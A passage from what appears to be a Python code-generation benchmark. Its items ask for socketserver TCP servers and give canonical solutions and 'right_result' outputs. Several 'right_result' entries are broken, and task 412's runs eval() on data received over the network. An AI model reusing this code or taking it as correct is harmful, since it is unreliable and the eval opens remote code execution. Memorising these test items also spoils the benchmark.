e:\n                    task.set_result(e)\n            for sock, task in self.writes:\n                try:\n                    sock.send(task.data)\n                    task.set_result(None)\n                except Exception as e:\n                    task.set_result(e)\n            for sock, task in self.accepts:\n                try:\n                    client, addr = sock.accept()\n                    task.set_result(Socket(client))\n                except Exception as e:\n                    task.set_result(e)"
  },
  {
    "Task_id": 409,
    "Instruction": "Task Description: Create a TCP server that handles both video streaming and sensor data processing concurrently, using separate ports for each type of data. The server should process video frames for object detection and control an RC car based on sensor inputs and detected objects.\n\nClass Description: Server - A class that manages two TCP servers running on different ports, one for video stream processing and another for sensor data handling. It uses multithreading to handle both servers concurrently.\n\nAttributes:\n- host: str - The host address where the server will run.\n- port1: int - The port number for the video stream server.\n- port2: int - The port number for the sensor data server.\n\nMethods:\n- video_stream(host: str, port: int) -> None - Starts a TCP server for video stream processing using the VideoStreamHandler class.\n- sensor_stream(host: str, port: int) -> None - Starts a TCP server for sensor data processing using the SensorDataHandler class.\n- start() -> None - Initializes and starts both servers in separate threads, with the sensor server running as a daemon thread.\n\nClass Description: VideoStreamHandler - A handler class for processing video streams, inheriting from socketserver.StreamRequestHandler. It performs object detection and controls an RC car based on the processed video frames and sensor data.\n\nAttributes:\n- nn: NeuralNetwork - A neural network model for image prediction.\n- obj_detection: ObjectDetection - An object detection utility.\n- rc_car: RCControl - An interface for controlling the RC car.\n- stop_cascade: cv2.CascadeClassifier - A classifier for detecting stop signs.\n- light_cascade: cv2.CascadeClassifier - A classifier for detecting traffic lights.\n- d_to_camera: DistanceToCamera - A utility for calculating distances to detected objects.\n- d_sensor_thresh: int - Threshold distance for sensor-based stopping.\n- d_stop_light_thresh: int - Threshold distance for stop sign and traffic light detection.\n- d_stop_sign: float - Current distance to the nearest stop sign.\n- d_light: float - Current distance to the nearest traffic light.\n- stop_start: int - Timestamp when stopping begins.\n- stop_finish: int - Timestamp when stopping ends.\n- stop_time: float - Duration of the stop.\n- drive_time_after_stop: float - Time driven after a stop.\n\nMethods:\n- __init__(request, client_address, server) -> None - Initializes the handler with necessary models and parameters.\n- handle() -> None - Processes incoming video stream, performs object detection, and controls the RC car based on the detected objects and sensor data.\n\nClass Description: SensorDataHandler - A handler class for processing sensor data, inheriting from socketserver.BaseRequestHandler. It reads and processes sensor data received from the client.\n\nAttributes: None\n\nMethods:\n- handle() -> None - Continuously reads sensor data from the client, updates the global sensor_data variable, and prints the received data.",
    "Canonical_solution": "import cv2\nimport sys\nimport threading\nimport socketserver\nimport numpy as np\n\nclass SensorDataHandler(socketserver.BaseRequestHandler):\n    def handle(self):\n        global sensor_data\n        while True:\n            data = self.request.recv(1024)\n            if not data:\n                break\n            sensor_data = round(float(data), 1)\n            print(sensor_data)\n\nclass VideoStreamHandler(socketserver.StreamRequestHandler):\n    def __init__(self, request, client_address, server):\n        self.nn = NeuralNetwork()\n        self.nn.load_model(\"saved_model/nn_model.xml\")\n        self.obj_detection = ObjectDetection()\n        self.rc_car = RCControl(\"/dev/tty.usbmodem1421\")\n        self.stop_cascade = cv2.CascadeClassifier(\"cascade_xml/stop_sign.xml\")\n        self.light_cascade = cv2.CascadeClassifier(\"cascade_xml/traffic_light.xml\")\n        self.d_to_camera = DistanceToCamera()\n        self.d_sensor_thresh = 30\n        self.d_stop_light_thresh = 25\n        self.d_stop_sign = self.d_stop_light_thresh\n        self.d_light = self.d_stop_light_thresh\n        self.stop_start = 0\n        self.stop_finish = 0\n        self.stop_time = 0\n        self.drive_time_after_stop = 0\n        super().__init__(request, client_address, server)\n\n    def handle(self):\n        global sensor_data\n        stream_bytes = b' '\n        stop_flag = False\n        stop_sign_active = True\n\n        try:\n            while True:\n                stream_bytes += self.rfile.read(1024)\n                first = stream_bytes.find(b'\\xff\\xd8')\n                last = stream_bytes.find(b'\\xff\\xd9')\n                if first != -1 and last != -1:\n                    jpg = stream_bytes[first:last + 2]\n                    stream_bytes = stream_bytes[last + 2:]\n                    gray = cv2.imdecode(np.frombuffer(jpg, dtype=np.uint8), cv2.IMREAD_GRAYSCALE)\n                    image = cv2.imdecode(np.frombuffer(jpg, dtype=np.uint8), cv2.IMREAD_COLOR)\n\n                    height, width = gray.shape\n                    roi = gray[int(height/2):height, :]\n\n                    v_param1 = self.obj_detection.detect(self.stop_cascade, gray, image)\n                    v_param2 = self.obj_detection.detect(self.light_cascade, gray, image)\n\n                    if v_param1 > 0 or v_param2 > 0:\n                        d1 = self.d_to_camera.calculate(v_param1, 5.5, 300, image)\n                        d2 = self.d_to_camera.calculate(v_param2, 5.5, 100, image)\n                        self.d_stop_sign = d1\n                        self.d_light = d2\n\n                    image_array = roi.reshape(1, int(height/2) * width).astype(np.float32)\n                    prediction = self.nn.predict(image_array)\n\n                    if sensor_data and int(sensor_data) < self.d_sensor_thresh:\n                        self.rc_car.stop()\n                        sensor_data = None\n                    elif 0 < self.d_stop_sign < self.d_stop_light_thresh and stop_sign_active:\n                        self.rc_car.stop()\n                        if not stop_flag:\n                            self.stop_start = cv2.getTickCount()\n                            stop_flag = True\n                        self.stop_finish = cv2.getTickCount()\n                        self.stop_time = (self.stop_finish - self.stop_start) / cv2.getTickFrequency()\n                        if self.stop_time > 5:\n                            stop_flag = False\n                            stop_sign_active = False\n                    elif 0 < self.d_light < self.d_stop_light_thresh:\n                        if self.obj_detection.red_light:\n                            self.rc_car.stop()\n                        self.d_light = self.d_stop_light_thresh\n                        self.obj_detection.red_light = False\n                    else:\n                        self.rc_car.steer(prediction)\n                        self.stop_start = cv2.getTickCount()\n                        self.d_stop_sign = self.d_stop_light_thresh\n                        if not stop_sign_active:\n                            self.drive_time_after_stop = (self.stop_start - self.stop_finish) / cv2.getTickFrequency()\n                            if self.drive_time_after_stop > 5:\n                                stop_sign_active = True\n\n                    if cv2.waitKey(1) & 0xFF == ord('q'):\n                        self.rc_car.stop()\n                        break\n        finally:\n            cv2.destroyAllWindows()\n            sys.exit()\n\nclass Server:\n    def __init__(self, host, port1, port2):\n        self.host = host\n        self.port1 = port1\n        self.port2 = port2\n\n    def video_stream(self, host, port):\n        s = socketserver.TCPServer((host, port), VideoStreamHandler)\n        s.serve_forever()\n\n    def sensor_stream(self, host, port):\n        s = socketserver.TCPServer((host, port), SensorDataHandler)\n        s.serve_forever()\n\n    def start(self):\n        sensor_thread = threading.Thread(target=self.sensor_stream, args=(self.host, self.port2))\n        sensor_thread.daemon = True\n        sensor_thread.start()\n        self.video_stream(self.host, self.port1)",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "right_result": "import socketserver\nimport threading\nimport cv2\nimport numpy as np\nfrom datetime import datetime, timedelta\n\nclass NeuralNetwork:\n    def predict(self, image):\n        # Placeholder for neural network prediction\n        return np.random.rand(1, 1)\n\nclass ObjectDetection:\n    def detect_objects(self, frame):\n        # Placeholder for object detection\n        return []\n\nclass RCControl:\n    def move_forward(self):\n        print(\"Moving forward\")\n    \n    def stop(self):\n        print(\"Stopping\")\n    \n    def turn_left(self):\n        print(\"Turning left\")\n    \n    def turn_right(self):\n        print(\"Turning right\")\n\nclass DistanceToCamera:\n    def calculate_distance(self, frame, obj_pos):\n        # Placeholder for distance calculation\n        return 10.0\n\nclass SensorDataHandler(socketserver.BaseRequestHandler):\n    sensor_data = {}\n\n    def handle(self):\n        data = self.request.recv(1024).decode()\n        if data:\n            self.sensor_data.update(data)\n            print(f\"Received sensor data: {self.sensor_data}\")\n\nclass VideoStreamHandler(socketserver.StreamRequestHandler):\n    def __init__(self, request, client_address, server):\n        self.nn = NeuralNetwork()\n        self.obj_detection = ObjectDetection()\n        self.rc_car = RCControl()\n        self.stop_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_stop_sign.xml')\n        self.light_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_traffic_light.xml')\n        self.d_to_camera = DistanceToCamera()\n        self.d_sensor_thresh = 5.0\n        self.d_stop_light_thresh = 10.0\n        self.d_stop_sign = 0.0\n        self.d_light = 0.0\n        self.stop_start = 0\n        self.stop_finish = 0\n        self.stop_time = 0.0\n        self.drive_time_after_stop = 0.0\n        super().__init__(request, client_address, server)\n\n    def handle(self):\n        while True:\n            try:\n                data = self.rfile.read(1024)\n                if not data:\n                    break\n                frame = cv2.imdecode(np.frombuffer(data, dtype=np.uint8), cv2.IMREAD_COLOR)\n                if frame is None:\n                    continue\n                objects = self.obj_detection.detect_objects(frame)\n                for obj in objects:\n                    dist = self.d_to_camera.calculate_distance(frame, obj)\n                    if dist < self.d_sensor_thresh:\n                        self.rc_car.stop()\n                        self.stop_start = int(datetime.now().timestamp())\n                if dist < self.d_stop_light_thresh:\n                    light = self.light_cascade.detectMultiScale(frame, scaleFactor=1.1, minNeighbors=5, minSize=(30, 30))\n                    if len(light) > 0:\n                        self.rc_car.stop()\n                        self.stop_start = int(datetime.now().timestamp())\n                if dist < self.d_stop_light_thresh and self.stop_start > 0:\n                    self.stop_finish = int(datetime.now().timestamp())\n                    self.stop_time = self.stop_finish - self.stop_start\n                    self.drive_time_after_stop = 0.0\n                    self.rc_car.move_forward()\n                elif self.stop_finish > 0 and self.stop_time > 0:\n                    self.drive_time_after_stop = int(datetime.now().timestamp()) - self.stop_finish\n                    self.rc_car.move_forward()\n            except Exception as e:\n                print(f\"Error in video stream handler: {e}\")\n                break\n\nclass Server:\n    def __init__(self, host, port1, port2):\n        self.host = host\n        self.port1 = port1\n        self.port2 = port2\n\n    def video_stream(self, host, port):\n        with socketserver.TCPServer((host, port), VideoStreamHandler) as server:\n            server.serve_forever()\n\n    def sensor_stream(self, host, port):\n        with socketserver.TCPServer((host, port), SensorDataHandler) as server:\n            server.serve_forever()\n\n    def start(self):\n        thread1 = threading.Thread(target=self.video_stream, args=(self.host, self.port1))\n        thread2 = threading.Thread(target=self.sensor_stream, args=(self.host, self.port2), daemon=True)\n        thread1.start()\n        thread2.start()"
  },
  {
    "Task_id": 41,
    "Instruction": "Task Description: Create a Python class that implements an asynchronous HTTP client for interacting with a REST API, supporting PUT and GET operations for question-answer pairs.\n\nClass Description: The Client class provides asynchronous HTTP communication capabilities using httpx and asyncio. It handles JSON data exchange with a REST API endpoint, allowing storage (PUT) and retrieval (GET) of question-answer pairs.\n\nAttributes:\n_uri: str - The base URI of the REST API endpoint (default: \"http://localhost:8000\")\n_CLIENT_HEADER: dict - Static dictionary containing HTTP headers for JSON content type\n\nMethods:\n_put: async (question: str, answer: str) -> int - Internal async method that sends a question-answer pair to the API via POST request. Returns HTTP status code.\n_get: async (question: str) -> str - Internal async method that retrieves an answer for a given question via POST request. Returns the answer string or None.\nput: (question: str, answer: str) -> int - Synchronous wrapper for _put that runs the async operation. Returns HTTP status code.\nget: (question: str) -> str - Synchronous wrapper for _get that runs the async operation. Returns the answer string or None.",
    "Canonical_solution": "import asyncio\nimport json\nimport httpx\n\n_CLIENT_HEADER = {\"Content-Type\": \"application/json\", \"Accept\": \"application/json\"}\n\nclass Client:\n    def __init__(self, uri: str = \"http://localhost:8000\"):\n        self._uri = uri\n\n    async def _put(self, question: str, answer: str):\n        async with httpx.AsyncClient() as client:\n            data = {\n                \"prompt\": question,\n                \"answer\": answer,\n            }\n            response = await client.post(\n                f\"{self._uri}/put\", headers=_CLIENT_HEADER, data=json.dumps(data)\n            )\n        return response.status_code\n\n    async def _get(self, question: str):\n        async with httpx.AsyncClient() as client:\n            data = {\n                \"prompt\": question,\n            }\n            response = await client.post(\n                f\"{self._uri}/get\", headers=_CLIENT_HEADER, data=json.dumps(data)\n            )\n        return response.json().get(\"answer\")\n\n    def put(self, question: str, answer: str):\n        return asyncio.run(self._put(question, answer))\n\n    def get(self, question: str):\n        return asyncio.run(self._get(question))",
    "Code_level": "Class-level",
    "FSMID_for_test": 59,
    "right_result": "class Client:\n    _uri: str = \"http://localhost:8000\"\n    _CLIENT_HEADER = {\"Content-Type\": \"application/json\"}\n\n    async def _put(self, question: str, answer: str) -> int:\n        import httpx\n        async with httpx.AsyncClient() as client:\n            data = {\"question\": question, \"answer\": answer}\n            response = await client.post(f\"{self._uri}/questions\", json=data, headers=self._CLIENT_HEADER)\n            return response.status_code\n\n    async def _get(self, question: str) -> str:\n        import httpx\n        async with httpx.AsyncClient() as client:\n            data = {\"question\": question}\n            response = await client.post(f\"{self._uri}/questions\", json=data, headers=self._CLIENT_HEADER)\n            if response.status_code == 200:\n                return response.json().get(\"answer\")\n            return None\n\n    def put(self, question: str, answer: str) -> int:\n        import asyncio\n        return asyncio.run(self._put(question, answer))\n\n    def get(self, question: str) -> str:\n        import asyncio\n        return asyncio.run(self._get(question))"
  },
  {
    "Task_id": 410,
    "Instruction": "Task Description: Create a TCP server that provides a Python console interface for remote clients, allowing them to interact with a Python environment through a socket connection.\n\nClass Description: PythonConsoleServer - A socketserver handler class that manages client connections and provides a Python console interface.\n\nAttributes:\n- env: [Any] - The Python environment/namespace that will be used for the console session.\n- console: [TerminatorConsole] - An instance of TerminatorConsole that handles the actual console interaction.\n- socketio: [io.TextIOWrapper] - A file-like object for socket communication.\n\nMethods:\n- setup() -> None - Initializes the console handler with the environment.\n- handle() -> None - Main method that handles client connections, redirects stdio, and runs the console.\n- verify_request(request, client_address) -> bool - Always returns True to accept all connections (override for security).\n- finish() -> None - Cleanup method (currently does nothing).\n\nClass Description: TerminatorConsole - Handles the actual console interaction and I/O processing.\n\nAttributes:\n- env: [Any] - The Python environment/namespace for the console session.\n- server: [PythonConsoleServer] - Reference to the server instance.\n\nMethods:\n- __init__(env) -> None - Initializes with the given environment.\n- parse_telnet(data) -> str - Processes telnet control characters from input.\n- raw_input(prompt=None) -> str - Reads input from client with optional prompt.\n- write(data) -> None - Writes output to the client.\n- run(server) -> None - Starts the interactive console session with the given server.\n\nFunction Description: spawn - Creates and starts the TCP server in a separate thread.\n\nInput:\n- env: [Any] - The Python environment/namespace to be used in the console sessions.\n\nOutput:\n- tuple: (threading.Thread, socketserver.TCPServer) - Returns the server thread and TCP server instance.",
    "Canonical_solution": "import socket\nimport threading\nimport sys\nif sys.version_info < (3, 0):\n    import SocketServer as socketserver\nelse:\n    import socketserver\nimport re\n\nclass PythonConsoleServer(socketserver.BaseRequestHandler):\n    env = None\n    \n    def setup(self):\n        self.console = TerminatorConsole(PythonConsoleServer.env)\n\n    def handle(self):\n        try:\n            self.socketio = self.request.makefile(mode='rw')\n            sys.stdout = self.socketio\n            sys.stdin = self.socketio\n            sys.stderr = self.socketio\n            self.console.run(self)\n        finally:\n            sys.stdout = sys.__stdout__\n            sys.stdin = sys.__stdin__\n            sys.stderr = sys.__stderr__\n            self.socketio.close()\n\n    def verify_request(self, request, client_address):\n        return True\n\n    def finish(self):\n        pass\n\nclass TerminatorConsole:\n    def __init__(self, env):\n        self.env = env\n\n    def parse_telnet(self, data):\n        data = re.sub('([^\\r])\\r', '\\\\1', data)\n        data = data.replace('\\r\\x00', '')\n        data = data.replace('\\x00', '')\n        return data\n\n    def raw_input(self, prompt=None):\n        if prompt:\n            self.write(prompt)\n\n        buf = ''\n        while True:\n            data = self.server.socketio.read(1)\n            if data == '\\n' or data == '\\006':\n                buf = self.parse_telnet(buf + data)\n                if buf != '':\n                    return buf\n            elif data == '\\004' or data == '':\n                raise EOFError\n            else:\n                buf += data\n\n    def write(self, data):\n        self.server.socketio.write(data)\n        self.server.socketio.flush()\n\n    def run(self, server):\n        self.server = server\n        self.interact()\n\ndef spawn(env):\n    PythonConsoleServer.env = env\n    tcpserver = socketserver.TCPServer(('127.0.0.1', 0), PythonConsoleServer)\n    debugserver = threading.Thread(target=tcpserver.serve_forever, name=\"DebugServer\")\n    debugserver.setDaemon(True)\n    debugserver.start()\n    return (debugserver, tcpserver)",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "right_result": "import socketserver\nimport threading\nimport io\nimport sys\n\nclass TerminatorConsole:\n    def __init__(self, env):\n        self.env = env\n        self.server = None\n\n    def parse_telnet(self, data):\n        return data\n\n    def raw_input(self, prompt=None):\n        return input(prompt)\n\n    def write(self, data):\n        sys.stdout.write(data)\n        sys.stdout.flush()\n\n    def run(self, server):\n        self.server = server\n        while True:\n            try:\n                line = self.raw_input()\n                if line.strip() == 'exit':\n                    break\n                result = eval(line, self.env)\n                self.write(str(result) + '\\n')\n            except Exception as e:\n                self.write(str(e) + '\\n')\n\nclass PythonConsoleServer(socketserver.BaseRequestHandler):\n    def __init__(self, request, client_address, server):\n        self.env = None\n        self.console = None\n        self.socketio = None\n        super().__init__(request, client_address, server)\n\n    def setup(self):\n        self.console = TerminatorConsole(self.env)\n        self.console.run(self)\n\n    def handle(self):\n        self.socketio = io.TextIOWrapper(self.request, newline='\\n')\n        self.setup()\n        self.console.run(self)\n\n    def verify_request(self, request, client_address):\n        return True\n\n    def finish(self):\n        pass\n\ndef spawn(env):\n    class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):\n        pass\n\n    server = ThreadedTCPServer((\"localhost\", 8000), PythonConsoleServer)\n    thread = threading.Thread(target=server.serve_forever)\n    thread.start()\n    return thread, server"
  },
  {
    "Task_id": 412,
    "Instruction": "Task Description: Implement a TCP server using Python's socketserver module to handle client connections and process incoming messages asynchronously.\n\nClass Description: The solution consists of two classes: ReceiveMsgSocketServer (a request handler) and SocketServerManager (a server manager). The handler processes incoming messages and the manager controls server lifecycle.\n\nAttributes:\n\nport: int - The port number on which the server will listen\nrequest_handler: class - The handler class for processing client requests\nserver: socketserver.ThreadingTCPServer - The TCP server instance\nserver_thread: threading.Thread - The thread running the server (when not in main thread)\n\nMethods:\n\nReceiveMsgSocketServer.handle() -> None - Processes client requests, receives messages, and sends responses\nReceiveMsgSocketServer.msg_callback(msg: dict) -> None - Static method to handle received messages (default prints messages)\nSocketServerManager.start_server(main_thread: bool = True) -> int or None - Starts the server, returns thread ID if not in main thread\nSocketServerManager.stop_server() -> None - Stops the server and cleans up resources",
    "Canonical_solution": "import ctypes\nimport json\nimport socketserver\nimport threading\n\nclass ReceiveMsgSocketServer(socketserver.BaseRequestHandler):\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n\n    def handle(self):\n        conn = self.request\n        while True:\n            try:\n                ptr_data = b\"\"\n                while True:\n                    data = conn.recv(1024)\n                    ptr_data += data\n                    if len(data) == 0 or data[-1] == 0xA:\n                        break\n                msg = json.loads(ptr_data.decode('utf-8'))\n                ReceiveMsgSocketServer.msg_callback(msg)\n            except OSError:\n                break\n            except json.JSONDecodeError:\n                pass\n            conn.sendall(\"200 OK\".encode())\n        conn.close()\n\n    @staticmethod\n    def msg_callback(msg):\n        print(msg)\n\nclass SocketServerManager:\n    def __init__(self, port: int = 10808, request_handler=ReceiveMsgSocketServer):\n        self.port = port\n        self.request_handler = request_handler\n        self.server = None\n        self.server_thread = None\n\n    def start_server(self, main_thread: bool = True) -> int or None:\n        ip_port = (\"127.0.0.1\", self.port)\n        try:\n            self.server = socketserver.ThreadingTCPServer(ip_port, self.request_handler)\n            if main_thread:\n                self.server.serve_forever()\n            else:\n                self.server_thread = threading.Thread(target=self.server.serve_forever)\n                self.server_thread.setDaemon(True)\n                self.server_thread.start()\n                return self.server_thread.ident\n        except KeyboardInterrupt:\n            pass\n        except Exception as e:\n            print(e)\n        return None\n\n    def stop_server(self):\n        if self.server:\n            self.server.shutdown()\n        if self.server_thread:\n            self.server_thread.join()",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "right_result": "import socketserver\nimport threading\n\nclass ReceiveMsgSocketServer(socketserver.BaseRequestHandler):\n    @staticmethod\n    def msg_callback(msg):\n        print(\"Received message:\", msg)\n\n    def handle(self):\n        data = self.request.recv(1024).strip()\n        try:\n            msg = eval(data)\n            ReceiveMsgSocketServer.msg_callback(msg)\n            self.request.sendall(b\"Message received\")\n        except Exception as e:\n            self.request.sendall(str(e).encode())\n\nclass SocketServerManager:\n    def __init__(self, port, request_handler):\n        self.port = port\n        self.request_handler = request_handler\n        self.server = socketserver.ThreadingTCPServer((('', port), 1), self.request_handler)\n        self.server_thread = threading.Thread(target=self.server.serve_forever)\n\n    def start_server(self, main_thread: bool = True) -> int or None:\n        self.server_thread.start()\n        if not main_thread:\n            return self.server_thread.ident\n        return None\n\n    def stop_server(self) -> None:\n        self.server.shutdown()\n        self.server_thread.join()"
  },
  {
    "Task_id": 413,
    "Instruction": "Task Description: Implement a TCP server using Python's socketserver module to handle incoming client connections, process JSON messages, and interact with a WeChat robot COM object for message processing and user information retrieval.\n\nClass Description: ReceiveMsgBaseServer is a custom request handler class that inherits from socketserver.BaseRequestHandler. It handles client connections, processes incoming JSON messages, and interacts with a WeChat robot COM object to enrich message data with user information.\n\nAttributes:\n- None (This class doesn't maintain persistent attributes beyond the inherited ones from BaseRequestHandler)\n\nMethods:\n- __init__(*args, **kwargs) -> None - Initializes the base request handler\n- handle() -> None - Main method that processes client connections, receives and parses JSON messages, and calls the message callback\n- msg_callback(msg: dict) -> None - Static method that processes the received message by interacting with WeChat robot COM objects to enrich message data with user information\n\nFunction Description: start_socket_server creates and starts a threaded TCP server that uses the ReceiveMsgBaseServer handler to process client connections.\n\nInput:\n- port: int (default=10808) - The port number to bind the server to\n- request_handler: class (default=ReceiveMsgBaseServer) - The request handler class to use\n- main_thread: bool (default=True) - Whether to run the server in the main thread or a daemon thread\n\nOutput:\n- int or None - Returns the thread identifier if main_thread=False, otherwise None (runs forever in main thread)",
    "Canonical_solution": "import socketserver\nimport threading\nimport comtypes\nimport json\n\nclass ReceiveMsgBaseServer(socketserver.BaseRequestHandler):\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n\n    def handle(self):\n        conn = self.request\n        comtypes.CoInitialize()\n        while True:\n            try:\n                ptr_data = b\"\"\n                while True:\n                    data = conn.recv(1024)\n                    ptr_data += data\n                    if len(data) == 0 or data[-1] == 0xA:\n                        break\n                msg = json.loads(ptr_data.decode('utf-8'))\n                ReceiveMsgBaseServer.msg_callback(msg)\n            except OSError:\n                break\n            except json.JSONDecodeError:\n                pass\n            conn.sendall(\"200 OK\".encode())\n        conn.close()\n        comtypes.CoUninitialize()\n\n    @staticmethod\n    def msg_callback(msg):\n        robot = comtypes.client.CreateObject(\"WeChatRobot.CWeChatRobot\")\n        event = comtypes.client.CreateObject(\"WeChatRobot.RobotEvent\")\n        wx = WeChatRobot(msg['pid'], robot, event)\n        userinfo = wx.GetWxUserInfo(msg['wxid'])\n        msg['alias'] = userinfo['wxNumber']\n        if msg['isSendMsg'] == 0:\n            if '@chatroom' in msg['sender']:\n                chatroom_info = wx.GetWxUserInfo(msg['sender'])\n                msg['chatroom_name'] = chatroom_info['wxNickName']\n                msg['nickname'] = wx.GetChatRoomMemberNickname(msg['sender'], msg['wxid'])\n            else:\n                msg['nickname'] = userinfo['wxNickName']\n        print(msg)\n        robot.Release()\n        event.Release()\n\ndef start_socket_server(port: int = 10808,\n                       request_handler: 'ReceiveMsgBaseServer' = ReceiveMsgBaseServer,\n                       main_thread=True) -> int or None:\n    ip_port = (\"127.0.0.1\", port)\n    try:\n        s = socketserver.ThreadingTCPServer(ip_port, request_handler)\n        if main_thread:\n            s.serve_forever()\n        else:\n            socket_server = threading.Thread(target=s.serve_forever)\n            socket_server.setDaemon(True)\n            socket_server.start()\n            return socket_server.ident\n    except KeyboardInterrupt:\n        pass\n    except Exception as e:\n        print(e)\n    return None",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "right_result": "import socketserver\nimport json\nimport threading\nimport comtypes.client\n\nclass ReceiveMsgBaseServer(socketserver.BaseRequestHandler):\n    def handle(self):\n        data = self.request.recv(1024).strip()\n        msg = json.loads(data)\n        ReceiveMsgBaseServer.msg_callback(msg)\n\n    @staticmethod\n    def msg_callback(msg):\n        # Example interaction with WeChat robot COM object\n        # Replace with actual implementation\n        wechat_robot = comtypes.client.CreateObject(\"WeChatRobot.Class\")\n        user_info = wechat_robot.GetUserInformation(msg[\"user_id\"])\n        msg[\"user_info\"] = user_info\n        # Process the enriched message\n        print(\"Processed message:\", msg)\n\ndef start_socket_server(port=10808, request_handler=ReceiveMsgBaseServer, main_thread=True):\n    class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):\n        pass\n\n    server = ThreadedTCPServer((\"localhost\", port), request_handler)\n    if not main_thread:\n        thread = threading.Thread(target=server.serve_forever)\n        thread.daemon = True\n        thread.start()\n        return thread.ident\n    else:\n        server.serve_forever()"
  },
  {
    "Task_id": 415,
    "Instruction": "Task Description: Implement a TCP server using Python's socketserver module to handle client requests with proper data framing and error handling.\n\nClass Description: TCPRequestHandler is a custom request handler class that inherits from socketserver.BaseRequestHandler. It handles TCP client connections by implementing methods to receive and send framed data, and processes client requests in the handle() method.\n\nAttributes:\n- request: [socket.socket] - The client connection socket object inherited from BaseRequestHandler\n- client_address: [tuple] - The client address (host, port) inherited from BaseRequestHandler\n- server: [socketserver.BaseServer] - The server instance inherited from BaseRequestHandler\n\nMethods:\n- get_data() -> bytes - Receives and validates framed data from the client. The data is expected to be prefixed with a 2-byte big-endian size field.\n  Input: None\n  Output: bytes - The received payload data (without size prefix)\n  \n- send_data(data: bytes) -> None - Sends framed data to the client by prefixing the payload with a 2-byte big-endian size field.\n  Input: data [bytes] - The payload data to send\n  Output: None\n  \n- handle() -> None - Main request handling method that coordinates receiving and processing client data.\n  Input: None\n  Output: None\n\nClass Description: DNSServer is a server management class that creates and manages TCP/UDP server instances for handling DNS requests.\n\nAttributes:\n- port: [int] - The port number to listen on (default: 53)\n- use_tcp: [bool] - Flag to enable TCP server (default: True)\n- use_udp: [bool] - Flag to enable UDP server (default: False)\n- servers: [list] - List of active server instances\n\nMethods:\n- __init__(port: int = 53, use_tcp: bool = True, use_udp: bool = False) -> None - Initializes the server configuration.\n  Input: \n    port [int] - Server port number\n    use_tcp [bool] - Enable TCP server\n    use_udp [bool] - Enable UDP server\n  Output: None\n  \n- start() -> None - Starts the configured servers in separate threads.\n  Input: None\n  Output: None\n  \n- shutdown() -> None - Shuts down all running server instances.\n  Input: None\n  Output: None",
    "Canonical_solution": "import socketserver\nimport struct\nimport threading\n\nclass TCPRequestHandler(socketserver.BaseRequestHandler):\n    def get_data(self):\n        data = self.request.recv(8192).strip()\n        sz = struct.unpack('>H', data[:2])[0]\n        if sz < len(data) - 2:\n            raise Exception(\"Wrong size of TCP packet\")\n        elif sz > len(data) - 2:\n            raise Exception(\"Too big TCP packet\")\n        return data[2:]\n\n    def send_data(self, data):\n        sz = struct.pack('>H', len(data))\n        return self.request.sendall(sz + data)\n\n    def handle(self):\n        try:\n            data = self.get_data()\n            self.send_data(dns_response(data))\n        except Exception:\n            pass\n\nclass DNSServer:\n    def __init__(self, port=53, use_tcp=True, use_udp=False):\n        self.port = port\n        self.use_tcp = use_tcp\n        self.use_udp = use_udp\n        self.servers = []\n\n    def start(self):\n        if self.use_tcp:\n            self.servers.append(socketserver.ThreadingTCPServer(('', self.port), TCPRequestHandler))\n        if self.use_udp:\n            self.servers.append(socketserver.ThreadingUDPServer(('', self.port), UDPRequestHandler))\n\n        for s in self.servers:\n            thread = threading.Thread(target=s.serve_forever)\n            thread.daemon = True\n            thread.start()\n\n    def shutdown(self):\n        for s in self.servers:\n            s.shutdown()",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "right_result": "import socketserver\nimport threading\n\nclass TCPRequestHandler(socketserver.BaseRequestHandler):\n    def get_data(self) -> bytes:\n        try:\n            size_bytes = self.request.recv(2)\n            if not size_bytes:\n                return b''\n            size = int.from_bytes(size_bytes, byteorder='big')\n            data = self.request.recv(size)\n            if len(data) < size:\n                raise ValueError(\"Incomplete data received\")\n            return data\n        except Exception as e:\n            print(f\"Error receiving data: {e}\")\n            return b''\n\n    def send_data(self, data: bytes) -> None:\n        try:\n            size_bytes = data[:2]\n            data = data[2:]\n            self.request.sendall(size_bytes)\n            self.request.sendall(data)\n        except Exception as e:\n            print(f\"Error sending data: {e}\")\n\n    def handle(self):\n        while True:\n            payload = self.get_data()\n            if not payload:\n                break\n            # Process the payload here\n            response = payload.upper()  # Example processing\n            self.send_data(response)\n\nclass DNSServer:\n    def __init__(self, port: int = 53, use_tcp: bool = True, use_udp: bool = False):\n        self.port = port\n        self.use_tcp = use_tcp\n        self.use_udp = use_udp\n        self.servers = []\n\n    def start(self):\n        if self.use_tcp:\n            server = socketserver.ThreadingTCPServer((('', self.port),), TCPRequestHandler)\n            self.servers.append(server)\n            threading.Thread(target=server.serve_forever).start()\n        if self.use_udp:\n            server = socketserver.ThreadingUDPServer((('', self.port),), TCPRequestHandler)\n            self.servers.append(server)\n            threading.Thread(target=server.serve_forever).start()\n\n    def shutdown(self):\n        for server in self.servers:\n            server.shutdown()"
  },
  {
    "Task_id": 418,
    "Instruction": "Task Description: Create a TCP server using Python's socketserver module that echoes back any received messages to the client.\n\nClass Description: The implementation consists of two classes: EchoHandler for handling client connections and EchoServer for managing the TCP server. The EchoHandler processes incoming messages and sends them back, while EchoServer initializes and runs the server.\n\nAttributes:\n- host: str - The host address to bind the server to (default: '' for all interfaces)\n- port: int - The port number to listen on (default: 20000)\n- server: TCPServer - The TCP server instance created with the specified host and port\n\nMethods:\n- EchoHandler.handle() -> None - Handles client connections by continuously receiving messages and echoing them back until the connection is closed\n- EchoServer.__init__(host: str = '', port: int = 20000) -> None - Initializes the server with the given host and port\n- EchoServer.serve_forever() -> None - Starts the server and keeps it running indefinitely while printing a status message",
